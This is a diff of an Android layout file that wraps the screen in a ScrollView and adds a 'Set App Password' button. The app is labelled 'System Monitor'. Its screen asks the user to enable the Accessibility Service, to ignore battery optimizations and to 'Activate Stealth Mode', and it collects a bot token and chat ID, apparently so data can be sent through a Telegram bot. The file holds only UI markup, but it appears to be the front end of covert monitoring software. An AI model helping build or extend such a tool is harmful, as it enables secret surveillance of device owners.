@@ -1,84 +1,97 @@
-<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:orientation="vertical"
-    android:padding="16dp"
-    android:gravity="center">
+    android:fillViewport="true">
 
-    <TextView
-        android:id="@+id/tv_status"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="System Monitor Status: Inactive"
-        android:textSize="18sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="24dp"/>
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="This app requires Accessibility Service to function."
-        android:textAlignment="center"
-        android:layout_marginBottom="24dp"/>
-
-    <Button
-        android:id="@+id/btn_enable_accessibility"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="1. Enable Accessibility Service"
-        android:layout_marginBottom="16dp"/>
-
-    <Button
-        android:id="@+id/btn_ignore_battery"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="2. Ignore Battery Optimizations"
-        android:layout_marginBottom="16dp"/>
-
-    <Button
-        android:id="@+id/btn_enable_stealth"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="3. Activate Stealth Mode"
-        android:backgroundTint="#FF5722"
-        android:layout_marginBottom="24dp"/>
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Connection Setup"
-        android:textSize="18sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="8dp"/>
-
-    <EditText
-        android:id="@+id/et_bot_token"
+    <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:hint="Bot Token"
-        android:inputType="text"
-        android:layout_marginBottom="8dp"/>
+        android:orientation="vertical"
+        android:padding="16dp"
+        android:gravity="center">
 
-    <EditText
-        android:id="@+id/et_chat_id"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:hint="Chat ID"
-        android:inputType="numberSigned"
-        android:layout_marginBottom="8dp"/>
+        <TextView
+            android:id="@+id/tv_status"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="System Monitor Status: Inactive"
+            android:textSize="18sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="24dp"/>
 
-    <Button
-        android:id="@+id/btn_save_connection"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Save Connection Details" />
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="This app requires Accessibility Service to function."
+            android:textAlignment="center"
+            android:layout_marginBottom="24dp"/>
 
-    <Button
-        android:id="@+id/btn_test_connection"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Test Connection"
-        android:layout_marginTop="16dp"/>
+        <Button
+            android:id="@+id/btn_enable_accessibility"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="1. Enable Accessibility Service"
+            android:layout_marginBottom="16dp"/>
 
-</LinearLayout>
+        <Button
+            android:id="@+id/btn_ignore_battery"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="2. Ignore Battery Optimizations"
+            android:layout_marginBottom="16dp"/>
+
+        <Button
+            android:id="@+id/btn_enable_stealth"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="3. Activate Stealth Mode"
+            android:backgroundTint="#FF5722"
+            android:layout_marginBottom="24dp"/>
+
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Connection Setup"
+            android:textSize="18sp"
+            android:textStyle="bold"
+            android:layout_marginBottom="8dp"/>
+
+        <Button
+            android:id="@+id/btn_set_password"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Set App Password"
+            android:layout_marginBottom="16dp"
+            android:backgroundTint="#673AB7"/>
+
+        <EditText
+            android:id="@+id/et_bot_token"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="Bot Token"
+            android:inputType="text"
+            android:layout_marginBottom="8dp"/>
+
+        <EditText
+            android:id="@+id/et_chat_id"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:hint="Chat ID"
+            android:inputType="numberSigned"
+            android:layout_marginBottom="8dp"/>
+
+        <Button
+            android:id="@+id/btn_save_connection"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Save Connection Details" />
+
+        <Button
+            android:id="@+id/btn_test_connection"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Test Connection"
+            android:layout_marginTop="16dp"/>
+
+    </LinearLayout>
+</ScrollView>
